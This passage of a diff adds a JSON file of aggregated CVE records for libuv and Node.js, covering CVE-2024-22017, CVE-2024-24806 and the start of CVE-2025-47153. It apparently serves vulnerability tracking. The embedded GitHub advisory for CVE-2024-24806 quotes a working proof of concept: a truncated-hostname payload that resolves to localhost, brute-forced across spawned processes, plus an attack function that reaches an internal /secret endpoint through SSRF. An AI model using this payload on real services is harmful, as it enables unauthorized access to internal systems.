+                    "lessThan": "17.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "19.0",
+                    "status": "affected",
+                    "lessThan": "19.*"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "20.0",
+                    "status": "affected",
+                    "lessThan": "20.11.1"
+                  },
+                  {
+                    "versionType": "semver",
+                    "version": "21.0",
+                    "status": "affected",
+                    "lessThan": "21.6.2"
+                  }
+                ]
+              }
+            ],
+            "references": [
+              {
+                "url": "https://hackerone.com/reports/2170226"
+              },
+              {
+                "url": "http://www.openwall.com/lists/oss-security/2024/03/11/1"
+              },
+              {
+                "url": "https://security.netapp.com/advisory/ntap-20240517-0007/"
+              }
+            ],
+            "metrics": [
+              {
+                "cvssV3_0": {
+                  "version": "3.0",
+                  "vectorString": "CVSS:3.0/AV:L/AC:L/PR:H/UI:N/S:C/C:L/I:H/A:L",
+                  "baseScore": 7.3,
+                  "baseSeverity": "HIGH"
+                }
+              }
+            ],
+            "providerMetadata": {
+              "orgId": "36234546-b8fa-4601-9d6f-f4e334aa8ea1",
+              "shortName": "hackerone",
+              "dateUpdated": "2025-04-30T22:25:14.211Z"
+            }
+          },
+          "adp": [
+            {
+              "providerMetadata": {
+                "orgId": "af854a3a-2127-422b-91ae-364da2661108",
+                "shortName": "CVE",
+                "dateUpdated": "2024-08-01T22:35:34.492Z"
+              },
+              "title": "CVE Program Container",
+              "references": [
+                {
+                  "url": "https://hackerone.com/reports/2170226",
+                  "tags": [
+                    "x_transferred"
+                  ]
+                },
+                {
+                  "url": "http://www.openwall.com/lists/oss-security/2024/03/11/1",
+                  "tags": [
+                    "x_transferred"
+                  ]
+                },
+                {
+                  "url": "https://security.netapp.com/advisory/ntap-20240517-0007/",
+                  "tags": [
+                    "x_transferred"
+                  ]
+                }
+              ]
+            },
+            {
+              "problemTypes": [
+                {
+                  "descriptions": [
+                    {
+                      "type": "CWE",
+                      "cweId": "CWE-250",
+                      "lang": "en",
+                      "description": "CWE-250 Execution with Unnecessary Privileges"
+                    }
+                  ]
+                }
+              ],
+              "affected": [
+                {
+                  "vendor": "nodejs",
+                  "product": "nodejs",
+                  "cpes": [
+                    "cpe:2.3:a:nodejs:nodejs:*:*:*:*:*:*:*:*"
+                  ],
+                  "defaultStatus": "unknown",
+                  "versions": [
+                    {
+                      "version": "18.0.0",
+                      "status": "affected",
+                      "lessThan": "18.18.0",
+                      "versionType": "custom"
+                    },
+                    {
+                      "version": "20.0.0",
+                      "status": "affected",
+                      "lessThan": "20.4.0",
+                      "versionType": "custom"
+                    },
+                    {
+                      "version": "21.0.0",
+                      "status": "affected",
+                      "lessThan": "21.6.1",
+                      "versionType": "custom"
+                    }
+                  ]
+                }
+              ],
+              "metrics": [
+                {
+                  "other": {
+                    "type": "ssvc",
+                    "content": {
+                      "timestamp": "2024-05-07T04:00:22.941212Z",
+                      "id": "CVE-2024-22017",
+                      "options": [
+                        {
+                          "Exploitation": "none"
+                        },
+                        {
+                          "Automatable": "no"
+                        },
+                        {
+                          "Technical Impact": "total"
+                        }
+                      ],
+                      "role": "CISA Coordinator",
+                      "version": "2.0.3"
+                    }
+                  }
+                }
+              ],
+              "title": "CISA ADP Vulnrichment",
+              "providerMetadata": {
+                "orgId": "134c704f-9b21-4f2e-91b3-4a467353bcc0",
+                "shortName": "CISA-ADP",
+                "dateUpdated": "2024-08-15T18:17:49.440Z"
+              }
+            }
+          ]
+        },
+        "dataVersion": "5.1"
+      },
+      "github_repository_security_advisory": null
+    },
+    {
+      "cve_id": "CVE-2024-24806",
+      "scope": "direct_upstream_libuv",
+      "inclusion_rationale": "Direct upstream libuv CVE with a GitHub security advisory, NVD libuv CPE coverage, and a Debian libuv package fix entry in this workspace.",
+      "local_repo_evidence": [
+        {
+          "path": "original/debian/changelog",
+          "line": 18,
+          "text": "    * Fix CVE-2024-24806 (Closes: #1063484)"
+        }
+      ],
+      "nvd": {
+        "id": "CVE-2024-24806",
+        "sourceIdentifier": "security-advisories@github.com",
+        "published": "2024-02-07T22:15:10.173",
+        "lastModified": "2024-11-21T08:59:45.137",
+        "vulnStatus": "Modified",
+        "cveTags": [],
+        "descriptions": [
+          {
+            "lang": "en",
+            "value": "libuv is a multi-platform support library with a focus on asynchronous I/O. The `uv_getaddrinfo` function in `src/unix/getaddrinfo.c` (and its windows counterpart `src/win/getaddrinfo.c`), truncates hostnames to 256 characters before calling `getaddrinfo`. This behavior can be exploited to create addresses like `0x00007f000001`, which are considered valid by `getaddrinfo` and could allow an attacker to craft payloads that resolve to unintended IP addresses, bypassing developer checks. The vulnerability arises due to how the `hostname_ascii` variable (with a length of 256 bytes) is handled in `uv_getaddrinfo` and subsequently in `uv__idna_toascii`. When the hostname exceeds 256 characters, it gets truncated without a terminating null byte. As a result attackers may be able to access internal APIs or for websites (similar to MySpace) that allows users to have `username.example.com` pages. Internal services that crawl or cache these user pages can be exposed to SSRF attacks if a malicious user chooses a long vulnerable username. This issue has been addressed in release version 1.48.0. Users are advised to upgrade. There are no known workarounds for this vulnerability."
+          },
+          {
+            "lang": "es",
+            "value": "libuv es una librería de soporte multiplataforma centrada en E/S asíncrona. La función `uv_getaddrinfo` en `src/unix/getaddrinfo.c` (y su contraparte de Windows `src/win/getaddrinfo.c`), trunca los nombres de host a 256 caracteres antes de llamar a `getaddrinfo`. Este comportamiento se puede aprovechar para crear direcciones como `0x00007f000001`, que `getaddrinfo` considera válidas y podrían permitir a un atacante crear payloads que se resuelvan en direcciones IP no deseadas, evitando las comprobaciones de los desarrolladores. La vulnerabilidad surge debido a cómo se maneja la variable `hostname_ascii` (con una longitud de 256 bytes) en `uv_getaddrinfo` y posteriormente en `uv__idna_toascii`. Cuando el nombre de host supera los 256 caracteres, se trunca sin un byte nulo final. Como resultado, los atacantes pueden acceder a API internas o a sitios web (similares a MySpace) que permiten a los usuarios tener páginas `nombre de usuario.ejemplo.com`. Los servicios internos que rastrean o almacenan en caché estas páginas de usuario pueden quedar expuestos a ataques SSRF si un usuario malintencionado elige un nombre de usuario largo y vulnerable. Este problema se solucionó en la versión 1.48.0. Se recomienda a los usuarios que actualicen. No se conocen workarounds para esta vulnerabilidad."
+          }
+        ],
+        "metrics": {
+          "cvssMetricV31": [
+            {
+              "source": "security-advisories@github.com",
+              "type": "Secondary",
+              "cvssData": {
+                "version": "3.1",
+                "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
+                "baseScore": 7.3,
+                "baseSeverity": "HIGH",
+                "attackVector": "NETWORK",
+                "attackComplexity": "LOW",
+                "privilegesRequired": "NONE",
+                "userInteraction": "NONE",
+                "scope": "UNCHANGED",
+                "confidentialityImpact": "LOW",
+                "integrityImpact": "LOW",
+                "availabilityImpact": "LOW"
+              },
+              "exploitabilityScore": 3.9,
+              "impactScore": 3.4
+            },
+            {
+              "source": "nvd@nist.gov",
+              "type": "Primary",
+              "cvssData": {
+                "version": "3.1",
+                "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
+                "baseScore": 7.3,
+                "baseSeverity": "HIGH",
+                "attackVector": "NETWORK",
+                "attackComplexity": "LOW",
+                "privilegesRequired": "NONE",
+                "userInteraction": "NONE",
+                "scope": "UNCHANGED",
+                "confidentialityImpact": "LOW",
+                "integrityImpact": "LOW",
+                "availabilityImpact": "LOW"
+              },
+              "exploitabilityScore": 3.9,
+              "impactScore": 3.4
+            }
+          ]
+        },
+        "weaknesses": [
+          {
+            "source": "security-advisories@github.com",
+            "type": "Secondary",
+            "description": [
+              {
+                "lang": "en",
+                "value": "CWE-918"
+              }
+            ]
+          }
+        ],
+        "configurations": [
+          {
+            "nodes": [
+              {
+                "operator": "OR",
+                "negate": false,
+                "cpeMatch": [
+                  {
+                    "vulnerable": true,
+                    "criteria": "cpe:2.3:a:libuv:libuv:*:*:*:*:*:*:*:*",
+                    "versionStartIncluding": "1.24.0",
+                    "versionEndExcluding": "1.48.0",
+                    "matchCriteriaId": "7A5D8905-1DA8-45F4-886D-2FDAA3C722DF"
+                  }
+                ]
+              }
+            ]
+          }
+        ],
+        "references": [
+          {
+            "url": "http://www.openwall.com/lists/oss-security/2024/02/08/2",
+            "source": "security-advisories@github.com",
+            "tags": [
+              "Mailing List",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "http://www.openwall.com/lists/oss-security/2024/02/11/1",
+            "source": "security-advisories@github.com",
+            "tags": [
+              "Mailing List",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "http://www.openwall.com/lists/oss-security/2024/03/11/1",
+            "source": "security-advisories@github.com"
+          },
+          {
+            "url": "https://github.com/libuv/libuv/commit/0f2d7e784a256b54b2385043438848047bc2a629",
+            "source": "security-advisories@github.com",
+            "tags": [
+              "Patch"
+            ]
+          },
+          {
+            "url": "https://github.com/libuv/libuv/commit/3530bcc30350d4a6ccf35d2f7b33e23292b9de70",
+            "source": "security-advisories@github.com",
+            "tags": [
+              "Patch"
+            ]
+          },
+          {
+            "url": "https://github.com/libuv/libuv/commit/c858a147643de38a09dd4164758ae5b685f2b488",
+            "source": "security-advisories@github.com",
+            "tags": [
+              "Patch"
+            ]
+          },
+          {
+            "url": "https://github.com/libuv/libuv/commit/e0327e1d508b8207c9150b6e582f0adf26213c39",
+            "source": "security-advisories@github.com",
+            "tags": [
+              "Patch"
+            ]
+          },
+          {
+            "url": "https://github.com/libuv/libuv/security/advisories/GHSA-f74f-cvh7-c6q6",
+            "source": "security-advisories@github.com",
+            "tags": [
+              "Exploit",
+              "Vendor Advisory"
+            ]
+          },
+          {
+            "url": "https://gitlab.kitware.com/cmake/cmake/-/issues/26112",
+            "source": "security-advisories@github.com"
+          },
+          {
+            "url": "https://lists.debian.org/debian-lts-announce/2024/03/msg00005.html",
+            "source": "security-advisories@github.com"
+          },
+          {
+            "url": "https://security.netapp.com/advisory/ntap-20240605-0008/",
+            "source": "security-advisories@github.com"
+          },
+          {
+            "url": "http://www.openwall.com/lists/oss-security/2024/02/08/2",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Mailing List",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "http://www.openwall.com/lists/oss-security/2024/02/11/1",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Mailing List",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "http://www.openwall.com/lists/oss-security/2024/03/11/1",
+            "source": "af854a3a-2127-422b-91ae-364da2661108"
+          },
+          {
+            "url": "https://github.com/libuv/libuv/commit/0f2d7e784a256b54b2385043438848047bc2a629",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Patch"
+            ]
+          },
+          {
+            "url": "https://github.com/libuv/libuv/commit/3530bcc30350d4a6ccf35d2f7b33e23292b9de70",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Patch"
+            ]
+          },
+          {
+            "url": "https://github.com/libuv/libuv/commit/c858a147643de38a09dd4164758ae5b685f2b488",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Patch"
+            ]
+          },
+          {
+            "url": "https://github.com/libuv/libuv/commit/e0327e1d508b8207c9150b6e582f0adf26213c39",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Patch"
+            ]
+          },
+          {
+            "url": "https://github.com/libuv/libuv/security/advisories/GHSA-f74f-cvh7-c6q6",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Exploit",
+              "Vendor Advisory"
+            ]
+          },
+          {
+            "url": "https://gitlab.kitware.com/cmake/cmake/-/issues/26112",
+            "source": "af854a3a-2127-422b-91ae-364da2661108"
+          },
+          {
+            "url": "https://lists.debian.org/debian-lts-announce/2024/03/msg00005.html",
+            "source": "af854a3a-2127-422b-91ae-364da2661108"
+          },
+          {
+            "url": "https://security.netapp.com/advisory/ntap-20240605-0008/",
+            "source": "af854a3a-2127-422b-91ae-364da2661108"
+          }
+        ]
+      },
+      "mitre": {
+        "dataType": "CVE_RECORD",
+        "cveMetadata": {
+          "cveId": "CVE-2024-24806",
+          "assignerOrgId": "a0819718-46f1-4df5-94e2-005712e83aaa",
+          "state": "PUBLISHED",
+          "assignerShortName": "GitHub_M",
+          "dateReserved": "2024-01-31T16:28:17.940Z",
+          "datePublished": "2024-02-07T21:44:33.566Z",
+          "dateUpdated": "2025-06-17T14:17:09.153Z"
+        },
+        "containers": {
+          "cna": {
+            "title": "Improper Domain Lookup that potentially leads to SSRF attacks in libuv",
+            "problemTypes": [
+              {
+                "descriptions": [
+                  {
+                    "cweId": "CWE-918",
+                    "lang": "en",
+                    "description": "CWE-918: Server-Side Request Forgery (SSRF)",
+                    "type": "CWE"
+                  }
+                ]
+              }
+            ],
+            "metrics": [
+              {
+                "cvssV3_1": {
+                  "attackComplexity": "LOW",
+                  "attackVector": "NETWORK",
+                  "availabilityImpact": "LOW",
+                  "baseScore": 7.3,
+                  "baseSeverity": "HIGH",
+                  "confidentialityImpact": "LOW",
+                  "integrityImpact": "LOW",
+                  "privilegesRequired": "NONE",
+                  "scope": "UNCHANGED",
+                  "userInteraction": "NONE",
+                  "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
+                  "version": "3.1"
+                }
+              }
+            ],
+            "references": [
+              {
+                "name": "https://github.com/libuv/libuv/security/advisories/GHSA-f74f-cvh7-c6q6",
+                "tags": [
+                  "x_refsource_CONFIRM"
+                ],
+                "url": "https://github.com/libuv/libuv/security/advisories/GHSA-f74f-cvh7-c6q6"
+              },
+              {
+                "name": "https://github.com/libuv/libuv/commit/0f2d7e784a256b54b2385043438848047bc2a629",
+                "tags": [
+                  "x_refsource_MISC"
+                ],
+                "url": "https://github.com/libuv/libuv/commit/0f2d7e784a256b54b2385043438848047bc2a629"
+              },
+              {
+                "name": "https://github.com/libuv/libuv/commit/3530bcc30350d4a6ccf35d2f7b33e23292b9de70",
+                "tags": [
+                  "x_refsource_MISC"
+                ],
+                "url": "https://github.com/libuv/libuv/commit/3530bcc30350d4a6ccf35d2f7b33e23292b9de70"
+              },
+              {
+                "name": "https://github.com/libuv/libuv/commit/c858a147643de38a09dd4164758ae5b685f2b488",
+                "tags": [
+                  "x_refsource_MISC"
+                ],
+                "url": "https://github.com/libuv/libuv/commit/c858a147643de38a09dd4164758ae5b685f2b488"
+              },
+              {
+                "name": "https://github.com/libuv/libuv/commit/e0327e1d508b8207c9150b6e582f0adf26213c39",
+                "tags": [
+                  "x_refsource_MISC"
+                ],
+                "url": "https://github.com/libuv/libuv/commit/e0327e1d508b8207c9150b6e582f0adf26213c39"
+              },
+              {
+                "url": "http://www.openwall.com/lists/oss-security/2024/02/08/2"
+              },
+              {
+                "url": "http://www.openwall.com/lists/oss-security/2024/02/11/1"
+              },
+              {
+                "url": "https://lists.debian.org/debian-lts-announce/2024/03/msg00005.html"
+              },
+              {
+                "url": "http://www.openwall.com/lists/oss-security/2024/03/11/1"
+              },
+              {
+                "url": "https://security.netapp.com/advisory/ntap-20240605-0008/"
+              },
+              {
+                "url": "https://gitlab.kitware.com/cmake/cmake/-/issues/26112"
+              }
+            ],
+            "affected": [
+              {
+                "vendor": "libuv",
+                "product": "libuv",
+                "versions": [
+                  {
+                    "version": ">= 1.45.0, < 1.48.0",
+                    "status": "affected"
+                  }
+                ]
+              }
+            ],
+            "providerMetadata": {
+              "orgId": "a0819718-46f1-4df5-94e2-005712e83aaa",
+              "shortName": "GitHub_M",
+              "dateUpdated": "2024-07-18T00:17:58.651Z"
+            },
+            "descriptions": [
+              {
+                "lang": "en",
+                "value": "libuv is a multi-platform support library with a focus on asynchronous I/O. The `uv_getaddrinfo` function in `src/unix/getaddrinfo.c` (and its windows counterpart `src/win/getaddrinfo.c`), truncates hostnames to 256 characters before calling `getaddrinfo`. This behavior can be exploited to create addresses like `0x00007f000001`, which are considered valid by `getaddrinfo` and could allow an attacker to craft payloads that resolve to unintended IP addresses, bypassing developer checks. The vulnerability arises due to how the `hostname_ascii` variable (with a length of 256 bytes) is handled in `uv_getaddrinfo` and subsequently in `uv__idna_toascii`. When the hostname exceeds 256 characters, it gets truncated without a terminating null byte. As a result attackers may be able to access internal APIs or for websites (similar to MySpace) that allows users to have `username.example.com` pages. Internal services that crawl or cache these user pages can be exposed to SSRF attacks if a malicious user chooses a long vulnerable username. This issue has been addressed in release version 1.48.0. Users are advised to upgrade. There are no known workarounds for this vulnerability."
+              }
+            ],
+            "source": {
+              "advisory": "GHSA-f74f-cvh7-c6q6",
+              "discovery": "UNKNOWN"
+            }
+          },
+          "adp": [
+            {
+              "providerMetadata": {
+                "orgId": "af854a3a-2127-422b-91ae-364da2661108",
+                "shortName": "CVE",
+                "dateUpdated": "2024-09-02T17:08:43.903Z"
+              },
+              "title": "CVE Program Container",
+              "references": [
+                {
+                  "name": "https://github.com/libuv/libuv/security/advisories/GHSA-f74f-cvh7-c6q6",
+                  "tags": [
+                    "x_refsource_CONFIRM",
+                    "x_transferred"
+                  ],
+                  "url": "https://github.com/libuv/libuv/security/advisories/GHSA-f74f-cvh7-c6q6"
+                },
+                {
+                  "name": "https://github.com/libuv/libuv/commit/0f2d7e784a256b54b2385043438848047bc2a629",
+                  "tags": [
+                    "x_refsource_MISC",
+                    "x_transferred"
+                  ],
+                  "url": "https://github.com/libuv/libuv/commit/0f2d7e784a256b54b2385043438848047bc2a629"
+                },
+                {
+                  "name": "https://github.com/libuv/libuv/commit/3530bcc30350d4a6ccf35d2f7b33e23292b9de70",
+                  "tags": [
+                    "x_refsource_MISC",
+                    "x_transferred"
+                  ],
+                  "url": "https://github.com/libuv/libuv/commit/3530bcc30350d4a6ccf35d2f7b33e23292b9de70"
+                },
+                {
+                  "name": "https://github.com/libuv/libuv/commit/c858a147643de38a09dd4164758ae5b685f2b488",
+                  "tags": [
+                    "x_refsource_MISC",
+                    "x_transferred"
+                  ],
+                  "url": "https://github.com/libuv/libuv/commit/c858a147643de38a09dd4164758ae5b685f2b488"
+                },
+                {
+                  "name": "https://github.com/libuv/libuv/commit/e0327e1d508b8207c9150b6e582f0adf26213c39",
+                  "tags": [
+                    "x_refsource_MISC",
+                    "x_transferred"
+                  ],
+                  "url": "https://github.com/libuv/libuv/commit/e0327e1d508b8207c9150b6e582f0adf26213c39"
+                },
+                {
+                  "tags": [
+                    "x_transferred"
+                  ],
+                  "url": "http://www.openwall.com/lists/oss-security/2024/02/08/2"
+                },
+                {
+                  "tags": [
+                    "x_transferred"
+                  ],
+                  "url": "http://www.openwall.com/lists/oss-security/2024/02/11/1"
+                },
+                {
+                  "tags": [
+                    "x_transferred"
+                  ],
+                  "url": "https://lists.debian.org/debian-lts-announce/2024/03/msg00005.html"
+                },
+                {
+                  "tags": [
+                    "x_transferred"
+                  ],
+                  "url": "http://www.openwall.com/lists/oss-security/2024/03/11/1"
+                },
+                {
+                  "tags": [
+                    "x_transferred"
+                  ],
+                  "url": "https://security.netapp.com/advisory/ntap-20240605-0008/"
+                },
+                {
+                  "tags": [
+                    "x_transferred"
+                  ],
+                  "url": "https://gitlab.kitware.com/cmake/cmake/-/issues/26112"
+                }
+              ],
+              "x_generator": {
+                "engine": "ADPogram 0.0.1"
+              }
+            },
+            {
+              "metrics": [
+                {
+                  "other": {
+                    "type": "ssvc",
+                    "content": {
+                      "timestamp": "2024-02-21T20:41:52.764681Z",
+                      "id": "CVE-2024-24806",
+                      "options": [
+                        {
+                          "Exploitation": "poc"
+                        },
+                        {
+                          "Automatable": "no"
+                        },
+                        {
+                          "Technical Impact": "partial"
+                        }
+                      ],
+                      "role": "CISA Coordinator",
+                      "version": "2.0.3"
+                    }
+                  }
+                }
+              ],
+              "title": "CISA ADP Vulnrichment",
+              "providerMetadata": {
+                "orgId": "134c704f-9b21-4f2e-91b3-4a467353bcc0",
+                "shortName": "CISA-ADP",
+                "dateUpdated": "2025-06-17T14:17:09.153Z"
+              }
+            }
+          ]
+        },
+        "dataVersion": "5.1"
+      },
+      "github_repository_security_advisory": {
+        "ghsa_id": "GHSA-f74f-cvh7-c6q6",
+        "cve_id": "CVE-2024-24806",
+        "url": "https://api.github.com/repos/libuv/libuv/security-advisories/GHSA-f74f-cvh7-c6q6",
+        "html_url": "https://github.com/libuv/libuv/security/advisories/GHSA-f74f-cvh7-c6q6",
+        "summary": "Improper Domain Lookup that potentially leads to SSRF attacks",
+        "description": "### Summary\r\nThe `uv_getaddrinfo` function in `src/unix/getaddrinfo.c` (and its windows counterpart `src/win/getaddrinfo.c`), truncates hostnames to 256 characters before calling `getaddrinfo`. This behavior can be exploited to create addresses like `0x00007f000001`, which are considered valid by `getaddrinfo` and could allow an attacker to craft payloads that resolve to unintended IP addresses, bypassing developer checks.\r\n\r\n### Details\r\nThe vulnerability arises due to how the `hostname_ascii` variable (with a length of 256 bytes) is handled in `uv_getaddrinfo` and subsequently in `uv__idna_toascii`. When the hostname exceeds 256 characters, it gets truncated without a terminating null byte. Depending on the build and runtime environment, it can lead to different exploitation scenarios:\r\n\r\n1. For example In some nodejs builds, like [the one distributed with Kali Linux](https://http.kali.org/kali/pool/main/n/nodejs/), the next byte in memory happens to be a null byte, making the truncated hostname valid.\r\n2. In other builds, the last byte of the hostname is a random value (0-256) but identical in successive calls, and the subsequent byte is a null byte. This situation can be exploited through brute force, especially in production environments where many Node.js instances run in parallel (`pm2`, `kubernetes`, etc).\r\n3. Since the last byte is random, there are cases where it's one of `0-9a-f`, which makes 16 possible cases (out of 256) useful for calling localhost (127.0.0.x) and potentially bypassing security measures on internal APIs. The same is true for calling other IP-ranges.\r\n\r\n### PoC\r\n```js\r\n// nodejs reproduction code:\r\nconst dns = require('dns');\r\nasync function run(ip, exactIP) {\r\n  let hexIP = ip.split('.').map(x => (+x).toString(16).padStart(2, '0')).join('');\r\n  if (!exactIP) {\r\n    hexIP = hexIP.substring(0, hexIP.length - 1);\r\n  }\r\n\r\n  const payload = `0x${'0'.repeat(256-hexIP.length-2)}${hexIP}.example.com`;\r\n  dns.lookup(payload, (err, addr) => {\r\n    if (err); // not successful\r\n    else if (addr === ip) console.log('*', addr);\r\n    else console.log(' ', addr); // resolved to a shifted ip-address\r\n  });\r\n}\r\n\r\nif (process.argv[2]) {\r\n  run ('4.2.2.4', true) // exact match, less probable (P=1/256), for kali-like builds works perfectly\r\n  // run('127.0.0.1', false); // any 127.0.0.x, higher probability (P=1/32)\r\n} else {\r\n  const cp = require('child_process')\r\n  for (let i=0; i<1024; ++i) {\r\n    cp.spawn('node', [process.argv[1], 'x'], { stdio: 'inherit' });\r\n  }\r\n}\r\n```\r\n\r\n### Impact\r\n1. **Access to Internal APIs:**\r\n    The following code, when deployed in an environment with multiple pods (e.g., Kubernetes), is vulnerable to the attack described above, potentially allowing unauthorized access to internal APIs.\r\n\r\n    ```js\r\n    const axios = require('axios');\r\n    const express = require('express');\r\n\r\n    const app = express();\r\n    app.get('/', async (req, res) => {\r\n        const url = req.query?.url || '';\r\n        if (new URL(url).hostname.endsWith('.example.com')) {\r\n          try {\r\n            const { data } = await axios.get(url, { timeout: 3000 });\r\n            res.send(data);\r\n          } catch(e) {\r\n            res.status(400).send('error');\r\n          }\r\n        } else {\r\n          res.status(400).send('Invalid url');\r\n        }\r\n    });\r\n    app.listen(80);\r\n\r\n    // internal endpoint available only to local IPs \r\n    // (in reality deployed inside another service)\r\n    const internalApp = express();\r\n    internalApp.get('/secret', (req, res) => {\r\n      res.send('the secret panel');\r\n    });\r\n    internalApp.listen(3000);\r\n\r\n    // pm2 start s1.js -i 128\r\n    ```\r\n\r\n    ```js\r\n    function attack() {\r\n      for (let i=0; i<128; i++) {\r\n        const payload = '0x' + '0'.repeat(246) + '7f000001';\r\n        fetch(`http://localhost?url=http://${payload}.example.com:3000/secret`)\r\n          .then(x => x.text())\r\n          .then(console.log);\r\n      }\r\n    }\r\n    ```\r\n\r\n2. **SSRF Attack:**\r\n    Another scenario involves websites (similar to MySpace) that allows users to have `username.example.com` pages. Internal services that crawl or cache these user pages can be exposed to SSRF attacks if a malicious user chooses a long vulnerable username.",
+        "severity": "high",
+        "author": null,
+        "publisher": {
+          "login": "santigimeno",
+          "id": 1084056,
+          "node_id": "MDQ6VXNlcjEwODQwNTY=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/1084056?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/santigimeno",
+          "html_url": "https://github.com/santigimeno",
+          "followers_url": "https://api.github.com/users/santigimeno/followers",
+          "following_url": "https://api.github.com/users/santigimeno/following{/other_user}",
+          "gists_url": "https://api.github.com/users/santigimeno/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/santigimeno/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/santigimeno/subscriptions",
+          "organizations_url": "https://api.github.com/users/santigimeno/orgs",
+          "repos_url": "https://api.github.com/users/santigimeno/repos",
+          "events_url": "https://api.github.com/users/santigimeno/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/santigimeno/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "identifiers": [
+          {
+            "value": "GHSA-f74f-cvh7-c6q6",
+            "type": "GHSA"
+          },
+          {
+            "value": "CVE-2024-24806",
+            "type": "CVE"
+          }
+        ],
+        "state": "published",
+        "created_at": null,
+        "updated_at": "2024-02-07T19:57:27Z",
+        "published_at": "2024-02-07T19:57:27Z",
+        "closed_at": null,
+        "withdrawn_at": null,
+        "submission": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "",
+              "name": ""
+            },
+            "vulnerable_version_range": ">= v1.24.0",
+            "patched_versions": "v1.48.0",
+            "vulnerable_functions": []
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": null,
+            "score": null
+          },
+          "cvss_v4": {
+            "vector_string": null,
+            "score": null
+          }
+        },
+        "cwes": [],
+        "cwe_ids": [],
+        "credits": [
+          {
+            "login": "arash16",
+            "type": "reporter"
+          }
+        ],
+        "credits_detailed": [
+          {
+            "user": {
+              "login": "arash16",
+              "id": 4003500,
+              "node_id": "MDQ6VXNlcjQwMDM1MDA=",
+              "avatar_url": "https://avatars.githubusercontent.com/u/4003500?v=4",
+              "gravatar_id": "",
+              "url": "https://api.github.com/users/arash16",
+              "html_url": "https://github.com/arash16",
+              "followers_url": "https://api.github.com/users/arash16/followers",
+              "following_url": "https://api.github.com/users/arash16/following{/other_user}",
+              "gists_url": "https://api.github.com/users/arash16/gists{/gist_id}",
+              "starred_url": "https://api.github.com/users/arash16/starred{/owner}{/repo}",
+              "subscriptions_url": "https://api.github.com/users/arash16/subscriptions",
+              "organizations_url": "https://api.github.com/users/arash16/orgs",
+              "repos_url": "https://api.github.com/users/arash16/repos",
+              "events_url": "https://api.github.com/users/arash16/events{/privacy}",
+              "received_events_url": "https://api.github.com/users/arash16/received_events",
+              "type": "User",
+              "user_view_type": "public",
+              "site_admin": false
+            },
+            "type": "reporter",
+            "state": "accepted"
+          }
+        ],
+        "collaborating_users": null,
+        "collaborating_teams": null,
+        "private_fork": null,
+        "cvss": {
+          "vector_string": null,
+          "score": null
+        }
+      }
+    },
+    {
+      "cve_id": "CVE-2025-47153",
+      "scope": "libuv_packaging_or_integration",
+      "inclusion_rationale": "The CVE text explicitly concerns libuv and Node.js 32-bit build processes with inconsistent off_t sizing; included as a libuv-related packaging/integration issue rather than a direct upstream code defect.",
+      "local_repo_evidence": [],
+      "nvd": {
+        "id": "CVE-2025-47153",
+        "sourceIdentifier": "cve@mitre.org",
+        "published": "2025-05-01T07:15:58.520",
+        "lastModified": "2025-05-02T19:15:55.930",
+        "vulnStatus": "Awaiting Analysis",
+        "cveTags": [],
+        "descriptions": [
+          {
+            "lang": "en",
+            "value": "Certain build processes for libuv and Node.js for 32-bit systems, such as for the nodejs binary package through nodejs_20.19.0+dfsg-2_i386.deb for Debian GNU/Linux, have an inconsistent off_t size (e.g., building on i386 Debian always uses _FILE_OFFSET_BITS=64 for the libuv dynamic library, but uses the _FILE_OFFSET_BITS global system default of 32 for nodejs), leading to out-of-bounds access. NOTE: this is not a problem in the Node.js software itself. In particular, the Node.js website's download page does not offer prebuilt Node.js for Linux on i386."
+          },
+          {
+            "lang": "es",
+            "value": "Ciertos procesos de compilación para libuv y Node.js en sistemas de 32 bits, como el paquete binario nodejs hasta nodejs_20.19.0+dfsg-2_i386.deb para Debian GNU/Linux, tienen un tamaño de archivo off_t inconsistente (p. ej., al compilar en Debian i386 siempre se usa _FILE_OFFSET_BITS=64 para la biblioteca dinámica libuv, pero se usa el valor predeterminado del sistema global _FILE_OFFSET_BITS de 32 para nodejs), lo que provoca accesos fuera de los límites. NOTA: Esto no es un problema del software Node.js en sí. En particular, la página de descargas del sitio web de Node.js no ofrece Node.js precompilado para Linux en i386."
+          }
+        ],
+        "metrics": {
+          "cvssMetricV31": [
+            {
+              "source": "cve@mitre.org",
+              "type": "Secondary",
+              "cvssData": {
+                "version": "3.1",
+                "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:L",
+                "baseScore": 6.5,
+                "baseSeverity": "MEDIUM",
+                "attackVector": "NETWORK",
+                "attackComplexity": "HIGH",
+                "privilegesRequired": "NONE",
+                "userInteraction": "NONE",
+                "scope": "CHANGED",
+                "confidentialityImpact": "LOW",
+                "integrityImpact": "LOW",
+                "availabilityImpact": "LOW"
+              },
+              "exploitabilityScore": 2.2,
+              "impactScore": 3.7
+            }
+          ]
+        },
+        "weaknesses": [
+          {
+            "source": "cve@mitre.org",
+            "type": "Secondary",
+            "description": [
+              {
